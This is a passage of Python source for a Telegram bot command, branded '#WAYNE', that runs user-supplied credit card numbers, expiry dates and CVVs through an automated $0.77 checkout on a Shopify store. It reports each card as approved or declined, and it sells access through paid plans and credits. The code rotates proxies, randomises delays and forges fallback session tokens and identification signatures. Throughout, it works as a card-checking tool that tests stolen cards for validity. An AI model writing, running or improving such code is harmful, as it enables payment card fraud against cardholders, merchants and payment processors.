            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.ua,
        }
        
        try:
            resp = await self.client.get(checkout_url, headers=headers, timeout=30, follow_redirects=True)
            self._update_cookies(resp)
            
            if resp.status_code != 200:
                return False, "Checkout page failed: {}".format(resp.status_code)
            
            html = resp.text
            
            self.extract_session_token(html)
            self.extract_stable_id(html)
            self.extract_queue_token(html)
            self.extract_signature(html)
            self.extract_payment_identifier(html)
            self.extract_delivery_strategy(html)
            self.extract_signed_handles(html)
            self.extract_pci_build_hash(html)
            
            self.logger.data_extracted("Session Token", (self.session_token or "N/A")[:25] + "...", "Checkout")
            self.logger.data_extracted("Stable ID", (self.stable_id or "N/A")[:20] + "...", "Checkout")
            self.logger.data_extracted("Queue Token", (self.queue_token or "N/A")[:20] + "...", "Checkout")
            self.logger.data_extracted("Signature", "FOUND" if self.signature else "NOT FOUND", "Checkout")
            self.logger.data_extracted("Payment ID", (self.payment_method_identifier or "N/A")[:20] + "...", "Checkout")
            self.logger.data_extracted("Delivery Handle", (self.delivery_strategy_handle or "N/A")[:25] + "...", "Checkout")
            self.logger.data_extracted("Signed Handles", "{} found".format(len(self.signed_handles)), "Checkout")
            
            if not self.session_token:
                self.session_token = "AAEB_" + self.generate_random_string(50)
                self.logger.data_extracted("Session Token", "GENERATED fallback", "Fallback")
            if not self.stable_id:
                self.stable_id = self.generate_uuid()
            if not self.queue_token:
                self.queue_token = "A{}".format(self.generate_random_string(43)) + "=="
                self.logger.data_extracted("Queue Token", "GENERATED fallback", "Fallback")
            
            return True, "CHECKOUT_OK"
        except Exception as e:
            return False, "Checkout page error: {}".format(str(e)[:50])

    async def create_payment_session(self, cc, mes, ano, cvv):
        self.step(6, "CREATE PAYMENT", "Creating PCI payment session")
        
        pci_headers = {
            'authority': 'checkout.pci.shopifyinc.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': 'https://checkout.pci.shopifyinc.com/build/{}/number-ltr.html?identifier=&locationURL='.format(self.pci_build_hash),
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'active',
            'user-agent': self.ua,
        }
        
        if self.signature:
            pci_headers['shopify-identification-signature'] = self.signature
        else:
            header = base64.urlsafe_b64encode(json.dumps({"kid": "v1", "alg": "HS256"}).encode()).decode().rstrip('=')
            payload_data = {"client_id": "2", "client_account_id": self.shop_id, "unique_id": self.checkout_token, "iat": int(time.time())}
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
            sig = self.generate_random_string(43)
            pci_headers['shopify-identification-signature'] = "{}.{}.{}".format(header, payload_b64, sig)
        
        card_number = cc.replace(" ", "").replace("-", "")
        year_full = ano if len(ano) == 4 else "20{}".format(ano)
        month_int = int(mes)
        
        pci_payload = {
            "credit_card": {
                "number": card_number,
                "month": month_int,
                "year": int(year_full),
                "verification_value": cvv,
                "name": self.full_name,
                "start_month": None,
                "start_year": None,
                "issue_number": ""
            },
            "payment_session_scope": "shopmiddleeastern.com"
        }
        
        try:
            self.pci_client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
            resp = await self.pci_client.post(
                'https://checkout.pci.shopifyinc.com/sessions',
                headers=pci_headers, json=pci_payload, timeout=30
            )
            
            if resp.status_code not in [200, 201]:
                return False, "PCI failed: {}".format(resp.status_code)
            
            pci_resp = resp.json()
            session_id = pci_resp.get('id')
            if not session_id:
                return False, "No session ID"
            
            self.logger.data_extracted("Payment Session", session_id[:30] + "...", "PCI")
            return True, session_id
        except httpx.ProxyError:
            self.proxy_status = "Dead 🚫"
            mark_proxy_failed(self.proxy_url)
            return False, "PROXY_DEAD"
        except Exception as e:
            return False, "PCI_ERROR"

    async def submit_for_completion(self, payment_session_id, cc):
        self.step(7, "SUBMIT PAYMENT", "Finalizing payment")
        
        graphql_url = "{}/checkouts/unstable/graphql".format(self.base_url)
        
        graphql_headers = {
            'authority': 'shopmiddleeastern.com',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': '{}/checkouts/cn/{}/en-us'.format(self.base_url, self.checkout_token),
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': 'id="{}", type="cn"'.format(self.checkout_token),
            'user-agent': self.ua,
            'x-checkout-one-session-token': self.session_token,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': self.checkout_token,
        }
        
        attempt_token = "{}-{}".format(self.checkout_token, self.generate_random_string(8))
        card_clean = cc.replace(" ", "").replace("-", "")
        credit_card_bin = card_clean[:8] if len(card_clean) >= 8 else card_clean[:6]
        
        delivery_expectation_lines = []
        if self.signed_handles:
            delivery_expectation_lines = [{"signedHandle": sh} for sh in self.signed_handles]
        
        if self.delivery_strategy_handle:
            delivery_strategy = {
                "deliveryStrategyByHandle": {
                    "handle": self.delivery_strategy_handle,
                    "customDeliveryRate": False
                },
                "options": {}
            }
        else:
            delivery_strategy = {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments": {"any": True}
                },
                "options": {}
            }
        
        variables = {
            "input": {
                "checkpointData": None,
                "sessionInput": {
                    "sessionToken": self.session_token
                },
                "queueToken": self.queue_token,
                "discounts": {
                    "lines": [],
                    "acceptUnexpectedDiscounts": True
                },
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "geolocation": {
                                "coordinates": self.coordinates,
                                "countryCode": "US"
                            }
                        },
                        "selectedDeliveryStrategy": delivery_strategy,
                        "targetMerchandiseLines": {
                            "lines": [{"stableId": self.stable_id}]
                        },
                        "deliveryMethodTypes": ["PICK_UP"],
                        "expectedTotalPrice": {
                            "value": {"amount": "0.00", "currencyCode": "USD"}
                        },
                        "destinationChanged": True
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True
                },
                "deliveryExpectations": {
                    "deliveryExpectationLines": delivery_expectation_lines
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": self.stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": "gid://shopify/ProductVariantMerchandise/{}".format(self.variant_id),
                                "variantId": "gid://shopify/ProductVariant/{}".format(self.variant_id),
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {
                            "value": {"amount": "0.75", "currencyCode": "USD"}
                        },
                        "lineComponentsSource": None,
                        "lineComponents": []
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": self.payment_method_identifier or payment_session_id,
                                "sessionId": payment_session_id,
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": self.address["address1"],
                                        "address2": self.address["address2"],
                                        "city": self.address["city"],
                                        "countryCode": self.address["countryCode"],
                                        "postalCode": self.address["zip"],
                                        "company": "",
                                        "firstName": self.first_name,
                                        "lastName": self.last_name,
                                        "zoneCode": self.address["provinceCode"],
                                        "phone": ""
                                    }
                                },
                                "cardSource": None
                            },
                            "giftCardPaymentMethod": None,
                            "redeemablePaymentMethod": None,
                            "walletPaymentMethod": None,
                            "walletsPlatformPaymentMethod": None,
                            "localPaymentMethod": None,
                            "paymentOnDeliveryMethod": None,
                            "paymentOnDeliveryMethod2": None,
                            "manualPaymentMethod": None,
                            "customPaymentMethod": None,
                            "offsitePaymentMethod": None,
                            "customOnsitePaymentMethod": None,
                            "deferredPaymentMethod": None,
                            "customerCreditCardPaymentMethod": None,
                            "paypalBillingAgreementPaymentMethod": None,
                            "remotePaymentInstrument": None
                        },
                        "amount": {
                            "value": {
                                "amount": "0.77",
                                "currencyCode": "USD"
                            }
                        }
                    }],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": self.address["address1"],
                            "address2": self.address["address2"],
                            "city": self.address["city"],
                            "countryCode": self.address["countryCode"],
                            "postalCode": self.address["zip"],
                            "company": "",
                            "firstName": self.first_name,
                            "lastName": self.last_name,
                            "zoneCode": self.address["provinceCode"],
                            "phone": ""
                        }
                    },
                    "creditCardBin": credit_card_bin
                },
                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": "USD",
                        "countryCode": "US"
                    },
                    "email": self.email,
                    "emailChanged": False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [
                        {"email": {"consentState": "GRANTED", "value": self.email}}
                    ],
                    "shopPayOptInPhone": {"countryCode": "US"},
                    "rememberMe": False,
                    "setShippingAddressAsDefault": False
                },
                "tip": {"tipLines": []},
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {"amount": "0.02", "currencyCode": "USD"}},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": []
                },
                "note": {
                    "message": None,
                    "customAttributes": []
                },
                "localizationExtension": {"fields": []},
                "shopPayArtifact": {
                    "optIn": {
                        "vaultEmail": "",
                        "vaultPhone": "",
                        "optInSource": "REMEMBER_ME"
                    }
                },
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": []
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "captcha": None,
                "cartMetafields": []
            },
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {
                "requestUrl": "{}/checkouts/cn/{}/en-us".format(self.base_url, self.checkout_token),
                "pageId": self.generate_uuid().upper()
            }
        }
        
        mutation = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'
        
        payload = {
            "query": mutation,
            "operationName": "SubmitForCompletion",
            "variables": variables
        }
        
        max_retries = 12
        
        for attempt_num in range(max_retries):
            try:
                resp = await self.client.post(
                    graphql_url,
                    headers=graphql_headers,
                    json=payload,
                    timeout=30
                )
                
                if resp.status_code != 200:
                    if attempt_num < max_retries - 1:
                        await asyncio.sleep(0.5)
                        continue
                    return False, "Submit failed: {}".format(resp.status_code)
                
                try:
                    res = resp.json()
                except:
                    if attempt_num < max_retries - 1:
                        await asyncio.sleep(0.5)
                        continue
                    return False, "Failed to parse submit response"
                
                if 'errors' in res and res.get('data') is None:
                    error_codes = [e.get('code', 'UNKNOWN') for e in res.get('errors', [])]
                    if error_codes:
                        return False, "DECLINED - " + ", ".join(error_codes)
                    if attempt_num < max_retries - 1:
                        await asyncio.sleep(0.5)
                        continue
                    return False, "DECLINED - Submit errors"
                
                data = res.get('data', {})
                submit = data.get('submitForCompletion', {})
                typename = submit.get('__typename', '')
                
                if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                    receipt = submit.get('receipt', {})
                    self.receipt_id = receipt.get('id')
                    
                    if not self.receipt_id:
                        return False, "DECLINED - No receipt ID"
                    
                    self.logger.data_extracted("Receipt ID", self.receipt_id.split('/')[-1], "Submit")
                    
                    receipt_type = receipt.get('__typename', '')
                    
                    if receipt_type == 'ProcessingReceipt':
                        poll_delay = receipt.get('pollDelay', 500) / 1000.0
                        await asyncio.sleep(poll_delay)
                        return await self.poll_receipt(graphql_headers)
                        
                    elif receipt_type == 'ProcessedReceipt':
                        return True, "ORDER_PLACED"
                        
                    elif receipt_type == 'ActionRequiredReceipt':
                        return False, "ACTIONREQUIREDRECEIPT"
                        
                    elif receipt_type == 'FailedReceipt':
                        error_info = receipt.get('processingError', {})
                        error_code = error_info.get('code', 'GENERIC_ERROR')
                        msg = error_info.get('messageUntranslated', '')
                        if msg:
                            return False, "DECLINED - {} - {}".format(error_code, msg[:50])
                        return False, "DECLINED - {}".format(error_code)
                    else:
                        return False, "Unknown receipt: {}".format(receipt_type)
                
                elif typename == 'SubmitRejected':
                    errors = submit.get('errors', [])
                    error_msgs = []
                    for e in errors:
                        code = e.get('code', 'UNKNOWN')
                        error_msgs.append(code)
                    if error_msgs:
                        return False, "DECLINED - " + "; ".join(error_msgs[:3])
                    return False, "DECLINED - Submit rejected"
                
                elif typename == 'SubmitFailed':
                    return False, "DECLINED - " + str(submit.get('reason', 'Submit failed'))[:50]
                
                elif typename == 'Throttled':
                    poll_after = submit.get('pollAfter', 1000)
                    self.queue_token = submit.get('queueToken', self.queue_token)
                    variables['input']['queueToken'] = self.queue_token
                    payload['variables'] = variables
                    await asyncio.sleep(poll_after / 1000.0)
                    continue
                
                elif typename == 'CheckpointDenied':
                    return False, "DECLINED - Checkpoint denied"
                
                else:
                    if attempt_num < max_retries - 1:
                        await asyncio.sleep(0.5)
                        continue
                    return False, "Unknown response: {}".format(typename)
                    
            except httpx.ProxyError:
                self.proxy_status = "Dead 🚫"
                mark_proxy_failed(self.proxy_url)
                return False, "PROXY_DEAD"
            except httpx.TimeoutException:
                if attempt_num < max_retries - 1:
                    await asyncio.sleep(0.5)
                    continue
                return False, "TIMEOUT"
            except Exception as e:
                if attempt_num < max_retries - 1:
                    await asyncio.sleep(0.5)
                    continue
                return False, "Submit error: {}".format(str(e)[:50])
        
        return False, "DECLINED - Max retries exceeded"

    async def poll_receipt(self, headers, max_polls=10):
        self.step(8, "POLL RECEIPT", "Polling for payment status")
        
        graphql_url = "{}/checkouts/unstable/graphql".format(self.base_url)
        
        poll_headers = dict(headers)
        poll_headers['accept'] = 'application/json'
        poll_headers['content-type'] = 'application/json'
        poll_headers['x-checkout-web-server-rendering'] = 'no'
        
        poll_query = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}'
        
        poll_variables = {
            "receiptId": self.receipt_id,
            "sessionToken": self.session_token
        }
        
        poll_payload = {
            "query": poll_query,
            "operationName": "PollForReceipt",
            "variables": poll_variables
        }
        
        for poll_attempt in range(max_polls):
            try:
                resp = await self.client.post(
                    graphql_url,
                    headers=poll_headers,
                    json=poll_payload,
                    timeout=30
                )
                
                if resp.status_code != 200:
                    await asyncio.sleep(2)
                    continue
                
                try:
                    data = resp.json()
                    receipt = data.get('data', {}).get('receipt', {})
                    tn = receipt.get('__typename', '')
                    
                    if tn == 'ProcessedReceipt':
                        self.logger.success_log("Payment processed", "After {} polls".format(poll_attempt + 1))
                        return True, "ORDER_PLACED"
                        
                    elif tn == 'ActionRequiredReceipt':
                        return False, "ACTIONREQUIREDRECEIPT"
                        
                    elif tn == 'FailedReceipt':
                        err = receipt.get('processingError', {})
                        code = err.get('code', 'GENERIC_ERROR')
                        msg = err.get('messageUntranslated', '')
                        if msg:
                            return False, "DECLINED - {} - {}".format(code, msg[:50])
                        return False, "DECLINED - {}".format(code)
                        
                    elif tn in ('ProcessingReceipt', 'WaitingReceipt'):
                        delay = receipt.get('pollDelay', 4000) / 1000.0
                        await asyncio.sleep(max(delay, 2))
                        continue
                    
                    else:
                        await asyncio.sleep(2)
                        continue
                        
                except:
                    await asyncio.sleep(2)
                    continue
                    
            except:
                await asyncio.sleep(2)
                continue
        
        return False, "DECLINED - Polling timeout"

    async def execute_checkout(self, cc, mes, ano, cvv):
        try:
            self.step(0, "GET PROXY", "Getting proxy")
            
            if PROXY_SYSTEM_AVAILABLE:
                self.proxy_url = get_proxy_for_user(self.user_id, "random")
                if not self.proxy_url:
                    self.logger.error_log("NO_PROXY", "No working proxies")
                    return False, "NO_PROXY_AVAILABLE"
                self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30, follow_redirects=True)
                self.proxy_status = "Live ⚡️"
                self.logger.data_extracted("Proxy", "{}...".format(self.proxy_url[:30]), "Proxy System")
            else:
                self.proxy_status = "No Proxy"
                self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
            
            success, result = await self.visit_homepage()
            if not success:
                return False, result
            await self.random_delay()
            
            success, result = await self.visit_product_page()
            if not success:
                return False, result
            await self.random_delay()
            
            success, result = await self.add_to_cart()
            if not success:
                return False, result
            await self.random_delay()
            
            success, result = await self.go_to_checkout()
            if not success:
                return False, result
            await self.random_delay(0.5, 0.8)
            
            success, result = await self.get_checkout_page()
            if not success:
                return False, result
            await self.random_delay()
            
            success, payment_session_id = await self.create_payment_session(cc, mes, ano, cvv)
            if not success:
                return False, payment_session_id
            await self.random_delay()
            
            success, result = await self.submit_for_completion(payment_session_id, cc)
            return success, result
            
        except Exception as e:
            self.logger.error_log("UNKNOWN", str(e)[:100])
            return False, "Checkout error: {}".format(str(e)[:50])
        finally:
            if self.client:
                await self.client.aclose()
            if self.pci_client:
                await self.pci_client.aclose()


# ========== MAIN CHECKER CLASS ==========
class ShopifyMiddleEasternChecker:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.logger = ShopifyLogger(user_id)
        self.proxy_status = "Dead 🚫"

    async def check_card(self, card_details, username, user_data):
        start_time = time.time()
        self.logger = ShopifyLogger(self.user_id)
        self.logger.start_check(card_details)

        try:
            cc, mes, ano, cvv = parse_card_input(card_details)
            
            if not cc or not mes or not ano or not cvv:
                elapsed_time = time.time() - start_time
                self.logger.error_log("INVALID_FORMAT", "Could not parse card")
                return format_shopify_response("", "", "", "", "Invalid card format", elapsed_time, username, user_data, self.proxy_status)

            if len(cc) < 15 or len(cc) > 19:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number length", elapsed_time, username, user_data, self.proxy_status)

            if not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data, self.proxy_status)

            if len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data, self.proxy_status)

            self.logger.card_details_log(cc, mes, ano, cvv)

            checker = ShopifyMiddleEasternCheckout(self.user_id)
            success, result = await checker.execute_checkout(cc, mes, ano, cvv)
            
            self.proxy_status = checker.proxy_status
            elapsed_time = time.time() - start_time

            if success:
                self.logger.complete_result(True, "APPROVED", result, elapsed_time)
            else:
                self.logger.complete_result(False, "DECLINED", result, elapsed_time)

            return format_shopify_response(cc, mes, ano, cvv, result, elapsed_time, username, user_data, self.proxy_status)

        except Exception as e:
            elapsed_time = time.time() - start_time
            self.logger.error_log("UNKNOWN", str(e)[:100])
            try:
                parsed = parse_card_input(card_details)
                if parsed:
                    cc, mes, ano, cvv = parsed
                else:
                    cc = mes = ano = cvv = ""
            except:
                cc = mes = ano = cvv = ""
            return format_shopify_response(cc, mes, ano, cvv, "UNKNOWN_ERROR", elapsed_time, username, user_data, self.proxy_status)


# ========== COMMAND HANDLER ==========
@Client.on_message(filters.command(["sf", ".sf", "$sf"]))
@auth_and_free_restricted
async def handle_shopify_middle_eastern(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        can_use, wait_time = check_cooldown(user_id, "si")
        if not can_use:
            await message.reply("""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{}</code>
🠪 <b>Anti-Spam:</b> <code>{}s</code>
━━━━━━━━━━━━━""".format(wait_time, plan_name, user_plan.get('antispam', 15)))
            return

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE 0.77$]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/sf</code>
🠪 <b>Usage</b>: <code>/sf [card details]</code>
🠪 <b>Examples</b>:
   • <code>/sf 4111111111111112|12|2030|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Shopify Charge 0.77$</code>""")
            return

        card_details = ' '.join(args[1:])

        cc, mes, ano, cvv = parse_card_input(card_details)
        if not cc or not mes or not ano or not cvv:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Could not extract valid card information.
🠪 <b>Example:</b> <code>/sf 4111111111111111|12|2030|123</code>
━━━━━━━━━━━━━""")
            return

        processing_msg = await message.reply(
            """
<b>[#Shopify Charge 0.77$] | #WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{}|{}|{}|{}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.77$</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Initiating...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {}
<b>[+] User:</b> @{}
━━━━━━━━━━━━━━━
<b>Processing... Please wait.</b>
""".format(cc, mes, ano, cvv, plan_name, username)
        )

        checker = ShopifyMiddleEasternChecker(user_id)

        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
            try:
                result = await charge_processor.execute_charge_command(
                    user_id,
                    checker.check_card,
                    card_details,
                    username,
                    user_data,
                    credits_needed=1,
                    command_name="si",
                    gateway_name="Shopify Charge 0.77$"
                )

                if isinstance(result, tuple) and len(result) == 3:
                    success, result_text, credits_deducted = result
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                elif isinstance(result, str):
                    await processing_msg.edit_text(result, disable_web_page_preview=True)
                else:
                    result_text = await checker.check_card(card_details, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)

            except Exception as e:
                print("❌ Charge processor error: {}".format(str(e)))
                try:
                    result_text = await checker.check_card(card_details, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                except Exception as inner_e:
                    await processing_msg.edit_text(
                        """<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""".format(str(inner_e)[:100])
                    )
        else:
            try:
                result_text = await checker.check_card(card_details, username, user_data)
                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
            except Exception as e:
                await processing_msg.edit_text(
                    """<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""".format(str(e)[:100])
                )

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply("""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.

━━━━━━━━━━━━━""".format(error_msg))
